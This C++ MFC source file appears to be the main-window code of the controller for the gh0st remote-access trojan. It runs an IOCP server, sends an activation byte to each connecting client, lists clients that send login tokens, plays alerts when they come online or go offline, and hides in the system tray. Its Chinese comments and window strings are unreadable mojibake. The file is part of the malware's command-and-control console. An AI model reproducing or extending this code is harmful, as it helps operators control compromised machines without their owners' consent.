
// MainFrm.cpp : CMainFrame ���ʵ��
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include <mmsystem.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame
CIOCPServer* g_iocpServer = NULL;   //ȫ�ֵ�IOCPָ��
Cgh0stView*  g_gh0stView = NULL;


IMPLEMENT_DYNCREATE(CMainFrame, CFrameWnd)

const int  iMaxUserToolbars = 10;
const UINT uiFirstUserToolBarId = AFX_IDW_CONTROLBAR_FIRST + 40;
const UINT uiLastUserToolBarId = uiFirstUserToolBarId + iMaxUserToolbars - 1;

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SYSCOMMAND()

	ON_MESSAGE(WM_ICON_NOTIFY,OnTrayNotification)

	ON_COMMAND(IDM_SHOW, &CMainFrame::OnShow)
	ON_COMMAND(IDM_HIDE, &CMainFrame::OnHide)
	ON_COMMAND(IDM_QUIT, &CMainFrame::OnQuit)
	ON_WM_CLOSE()
	ON_WM_TIMER()
END_MESSAGE_MAP()

//ָʾ��
static UINT indicators[] =  
{
    ID_STATUSTIP,           // ����IP��ַ
    ID_STATUSSPEED,         // �ٶ�
    ID_STATUSPORT,          // �˿�
    ID_STATUSCOUNT          // ����
};

// CMainFrame ����/����

CMainFrame::CMainFrame()
{
	// TODO: �ڴ���ӳ�Ա��ʼ������
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	if (!m_wndStatusBar.Create(this))
	{
		TRACE0("δ�ܴ���״̬��\n");
		return -1;      // δ�ܴ���
	}

	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT));

    m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 160);
    m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
    m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 80);

	// TODO: �������Ҫ��ͣ������������ɾ��������
    if (!m_wndTab.Create(WS_CHILD | WS_VISIBLE | CTCS_AUTOHIDEBUTTONS | CTCS_TOOLTIPS | CTCS_DRAGMOVE | CTCS_LEFT,
        CRect(0, 0, 0, 15), this, IDC_TABCTRL)
        )
    {
        TRACE0("Failed to create tab control\n");
        return -1;
    }

    m_wndTab.SetDragCursors(AfxGetApp()->LoadStandardCursor(IDC_CROSS), NULL);

    m_wndTab.ModifyStyle(CTCS_LEFT, 0, 0);

	EnableDocking(CBRS_ALIGN_ANY);

	SetTimer(8888, 800,NULL);

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: �ڴ˴�ͨ���޸�
	//  CREATESTRUCT cs ���޸Ĵ��������ʽ
    cs.style &= ~FWS_ADDTOTITLE;   //��ԭ�еĴ������ȥ��
    cs.lpszName = "��֤������";    //�޸��˴���ı���

    cs.cx = 646;
    cs.cy = 310;

	return TRUE;
}

// CMainFrame ���

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame ��Ϣ�������
void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
{
    CString str;
    //һ��������ᷢ��
    if (g_iocpServer)
    {
        g_iocpServer->Shutdown();
        delete g_iocpServer;
        g_iocpServer = NULL;
    }

    g_iocpServer = new CIOCPServer();
    if (g_iocpServer->Initialize(NotifyProc, this, nMaxConnections, nPort))
    {
        //�����������ɹ���
        str.Format("�˿�:%d", nPort);
        m_wndStatusBar.SetPaneText(2, str);
    }

}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
    //
    try
    {
        CMainFrame* pFrame = (CMainFrame*)lpParam;
		BYTE bData;   //����1�ֽڷ����ר���������
        // ��g_pConnectView ���г�ʼ��
         g_gh0stView = (Cgh0stView*)((Cgh0stApp *)AfxGetApp())->m_gh0stView;

        switch (nCode)
        {
        case NC_CLIENT_CONNECT:     //�ͻ�������
			bData = COMMAND_ACTIVED;
			g_iocpServer->Send(pContext, &bData, 1);  //ͨ������iocp���͸��Ǹ����ӹ����Ŀͻ�һ�������  Ϊ����ס�ͻ���
            break;
        case NC_CLIENT_DISCONNECT:  //�ͻ��˶Ͽ�
			{
			if (((Cgh0stApp*)AfxGetApp())->m_bSound)
			{
				CString strBuf;

				strBuf.Format("%s\\Offline.wav", ((Cgh0stApp *)AfxGetApp())->m_AppPath);
				sndPlaySound(strBuf, SND_ASYNC);   //�첽�Ĳ�������
			}
				g_gh0stView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			}
			
            break;
        case NC_TRANSMIT:           //�����ļ�
            break;
        case NC_RECEIVE:            //�����ļ�
            //ProcessReceive(pContext);
            break;
        case NC_RECEIVE_COMPLETE:   //�������
            ProcessReceiveComplete(pContext);
            break;
        }
    }
    catch (...) 
    {
    }
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)  //������ָ�루Ҳ���ǿͻ��ˣ�
{
    CString strBuf;

    switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
    {
        case TOKEN_LOGIN: //��½��Ϣ������
        {
			CString strBuf;
			if (((Cgh0stApp*)AfxGetApp())->m_bSound)
			{
				if (((Cgh0stApp*)AfxGetApp())->m_strSoundFile.IsEmpty())
				{
					strBuf.Format("%s\\Login.wav", ((Cgh0stApp *)AfxGetApp())->m_AppPath);
				}
				else
				{
					strBuf = (((Cgh0stApp *)AfxGetApp())->m_strSoundFile);
				}	
				sndPlaySound(strBuf, SND_ASYNC);   //�첽�Ĳ�������
			}
			
            g_gh0stView->PostMessage(WM_ADDTOLIST, NULL, (LPARAM)pContext);
        }
        break;
        // ����ֹͣ��ǰ����
        default:
            closesocket(pContext->m_Socket);
            break;
    }
}



void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (nID == SC_MINIMIZE)  //��С��
	{
		if (!m_TrayIcon.Enabled())  //���û�д�������ͼ���򴴽�����һ�δ�����������Ͳ����ٴ����ˣ�
		{
			m_TrayIcon.Create(this, WM_ICON_NOTIFY, "������������.....",
				AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE);  //����
		}
		ShowWindow(SW_HIDE);//���ش���
	}
	else
	{
		CFrameWnd::OnSysCommand(nID, lParam);
	}

	
}

LRESULT CMainFrame::OnTrayNotification(WPARAM wParam, LPARAM lParam)
{
	if (LOWORD(lParam) == WM_LBUTTONDBLCLK)  //˫��
	{
		ShowWindow(SW_SHOW);
		return TRUE;
	}
	return m_TrayIcon.OnTrayNotification(wParam, lParam);
}

void CMainFrame::OnShow()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_SHOW);
}


void CMainFrame::OnHide()
{
	// TODO: �ڴ���������������
	ShowWindow(SW_HIDE);
}


void CMainFrame::OnQuit()
{
	// TODO: �ڴ���������������
	OnClose();
}


void CMainFrame::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_TrayIcon.RemoveIcon();

	g_iocpServer->Shutdown();    //�ر���ɶ˿ڷ�����

	delete g_iocpServer;

	CFrameWnd::OnClose();
}


void CMainFrame::OnTimer(UINT_PTR nIDEvent)  //ֻ��UI�߳��й���
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	static int nShow = 0;

	switch (nIDEvent)
	{
	case 8888:
		{
			if (nShow == 0)
			{
				m_TrayIcon.SetIcon(IDI_ICON1);
				nShow = 1;
			}
			else
			{
				m_TrayIcon.SetIcon(IDR_MAINFRAME);
				nShow = 0;
			}

		}
		break;
	}
	
	CFrameWnd::OnTimer(nIDEvent);
}
